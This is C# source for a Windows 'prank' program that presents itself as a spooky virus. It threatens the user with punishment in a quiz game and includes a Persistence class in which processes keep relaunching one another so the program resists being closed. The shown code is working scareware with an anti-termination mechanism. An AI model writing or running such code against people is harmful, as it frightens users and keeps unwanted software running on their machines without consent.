using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace prankxd
{
    public partial class Form1 : Form
    {
        int _index;
        char[] fakechars;
        string typertext = "Hello!, My name is spooker and I'm a very spooky program. You are probably very spooked now and you thing I'm a bad bad virus!" +
            " well you are right. Do you want to save your PC? Lets play a game >:)"+
            " I will give you some questions and you will have to answer them correctly."+
            " If you get the answer wrong 3 times you will be punished:). Good luck...";
        public Form1()
        {
            InitializeComponent();
            Persistence.Start();
        }
       
        private void Form1_Load(object sender, EventArgs e)
        {
            fakechars = typertext.ToCharArray();
            timer1.Start();
        }

        private void timer1_Tick_1(object sender, EventArgs e)
        {
            try
            {
                txtTyper.Text += fakechars[_index];
                _index++;
            }
            catch (Exception ex)
            {
                timer1.Stop();
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            Clipboard.SetText("taskkill /im \"prankxd.exe\" /f");    
        }

        private void btnNo_Click(object sender, EventArgs e)
        {
            MessageBox.Show("No way out...", "nope", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
        }

        private void btnYes_Click(object sender, EventArgs e)
        {
            frmgame frm = new frmgame();
            frm.Show();
            this.Hide();
        }
    }
    public class Persistence
    {

        public static void Start()
        {
            string[] lpCmdLine = Environment.GetCommandLineArgs();                                  // Gets the command lines passed to the process
            if (lpCmdLine.Length == 1)                                                              // if there is not extra arguments (only 1)
            {
                Thread t = new Thread(CreateWatcher);                                    // CreateParams the instance of the Thread
                t.IsBackground = true;                                                              // Sets the thread to background which allows it to exit properly
                t.Start();                                                                          // Starts the watcher thread 
            }
            else if (lpCmdLine.Length == 2)                                                         // if there is an extra argument (2 args)
            {
                int ProcID = 0;                                                                     // declare a integer to store the processs ID
                if (Int32.TryParse(lpCmdLine[1], out ProcID))                                       // try to convert the commandline string to an integer
                {
                    Process p = Process.GetProcessById(ProcID);                                     // Open the process based on the pID passed to the process
                    p.WaitForExit();                                                                // Wait for the main process to close
                    Thread t = new Thread(CreateWatcher);                                // CreateParams the instance of the Thread
                    t.IsBackground = true;                                                          // Sets the thread to background which allows it to exit properly
                    t.Start();                                                                      // Starts the watcher thread 
                }
            }


        }



        public static void CreateWatcher()
        {
            while (true)                                                                            // while true...
            {
                int CurrentProcId = Process.GetCurrentProcess().Id;                                 // Get the current process ID
                Process p = Process.Start(Application.ExecutablePath, CurrentProcId.ToString());    // Start a new watcher process, passing the current PID as the process to protect
                p.WaitForExit();
                // Wait for the watcher to exit, if it does to will loop and be created again
            }
        }
    }
}
